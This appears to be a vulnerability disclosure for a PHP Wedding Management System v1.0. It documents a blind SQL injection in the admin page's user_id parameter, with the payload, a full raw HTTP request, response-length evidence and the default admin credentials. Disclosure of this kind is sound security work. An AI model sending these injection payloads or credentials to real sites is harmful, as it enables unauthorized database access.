# WeddingManagement System v1.0 by codeastr.com has SQL injection

Author： k0xx

The password for the backend login account is: admin@mail.com/Password@123

vendors: https://codeastro.com/wedding-management-system-in-php-with-source-code/

Vulnerability File: /Wedding-Management/admin/client_manage_account_details.php?booking_id=31&user_id=

Vulnerability location: /Wedding-Management/admin/client_manage_account_details.php?booking_id=31&user_id=,user_id

[+] Payload: /Wedding-Management/admin/client_manage_account_details.php?booking_id=31&user_id=31%20and%20length(database())%20=9 // Leak place ---> user_id

Current database name: dbwedding,length is 9

```sql
GET /Wedding-Management/admin/client_manage_account_details.php?booking_id=31&user_id=31%20and%20length(database())%20=9 HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=0m2td1md252hlnr3nsbmc5ss99
Connection: close
```

When length (database ()) = 8, Content-Length: 15416

![image](https://user-images.githubusercontent.com/54017627/167992433-5601929b-6895-4246-87ea-f854977dc06a.png)

![image](https://user-images.githubusercontent.com/54017627/167992386-4f3a240f-ec5c-4794-92c3-1fcaddc55277.png)

When length (database ()) = 9, Content-Length: 15233

![image](https://user-images.githubusercontent.com/54017627/167992413-9a6054ba-38d7-4d48-aeab-a2c218c890ae.png)


![image](https://user-images.githubusercontent.com/54017627/167992369-29977d4b-a079-4420-86a5-f607a8135386.png)

